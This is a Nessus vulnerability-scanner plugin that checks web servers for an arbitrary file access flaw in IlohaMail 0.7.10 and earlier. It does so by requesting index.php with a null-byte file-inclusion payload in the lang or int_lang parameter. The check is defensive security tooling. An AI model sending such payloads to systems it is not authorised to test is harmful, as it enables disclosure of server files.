#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

# Changes by Tenable:
# - changed family, output formatting (9/5/09)
# - title touch-up (12/30/10)


include("compat.inc");

if (description) {
  script_id(14630);
  script_version("$Revision: 1.12 $");

# script_cve_id("CVE-MAP-NOMATCH");
  script_osvdb_id(7400);
# NOTE: no CVE id assigned (gat, 01/2005)
 
  script_name(english:"IlohaMail index.php init_lang Parameter Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected by
an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The target is running at least one instance of IlohaMail version
0.7.10 or earlier.  Such versions contain a flaw in the processing of
the language variable that allows an unauthenticated attacker to
retrieve arbitrary files available to the web user." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?066bde18" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to IlohaMail version 0.7.11 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/03/04");
 script_cvs_date("$Date: 2015/01/22 21:12:16 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for Arbitrary File Access via Language Variable vulnerability in IlohaMail");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2004-2015 George A. Theall");
  script_family(english:"CGI abuses");
  script_dependencie("global_settings.nasl", "ilohamail_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

# Specify the file to grab from target, relative to IlohaMail/lang directory.
# ./notes.txt exists in each version I've seen. If you change it to 
# something else, you will also need to change the pattern checked
# against the variable 'contents' below.
file = "./notes.txt";

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
debug_print("searching for IlohaMail Arbitrary File Access via Language Variable vulnerability on port ", port, ".");

# Check each installed instance, stopping if we find a vulnerable version.
installs = get_kb_list(string("www/", port, "/ilohamail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    debug_print("checking version ", ver, " under ", dir, ".");

    # Try to exploit the vulnerability.
    #
    # nb: the hole exists because conf/defaults.inc et al. trust 
    #     the language setting when calling include() to read
    #     language settings ('int_lang' in more recent versions,
    #     'lang' in older ones).
    foreach lang (make_list('int_lang', 'lang')) {
      url = string(dir, "/index.php?", lang, "=", file, "%00");
      debug_print("retrieving ", url, "...");
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if (res == NULL) exit(0);           # can't connect
      debug_print("res =>>", res, "<<.");

      # nb: if successful, file contents will appear between the closing 
      #     HEAD tag and the opening BODY tag, although note that later
      #     versions put a session key there.
      contents = strstr(res, "</HEAD>");
      if (contents != NULL) {
        contents = contents - strstr(contents, "<BODY>");
        debug_print("contents=>>", contents, "<<.");
        # nb: make sure the pattern match agrees with the file retrieved.
        if (contents =~ "New strings") {
          security_warning(port);
          exit(0);
        }
      }
    }
  }
}
